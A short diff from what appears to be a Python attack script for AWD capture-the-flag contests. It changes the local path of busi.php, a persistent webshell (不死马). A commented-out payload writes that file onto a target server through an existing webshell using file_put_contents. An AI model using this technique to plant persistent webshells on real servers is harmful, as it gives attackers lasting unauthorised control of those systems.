@@ -31,7 +31,7 @@ payload = {
 }
 
 # 写入不死马
-file = open("busi.php", "r", encoding="utf-8").read()  # 本地的不死马文件名
+file = open("E:/tool/AWD/Network-security-tools/Attack/busi.php", "r", encoding="utf-8").read()  # 本地的不死马文件名
 # data = {
 #     passwd: "file_put_contents(\"busi.php\",\"" + file + "\");"  # 写入不死马
 # }
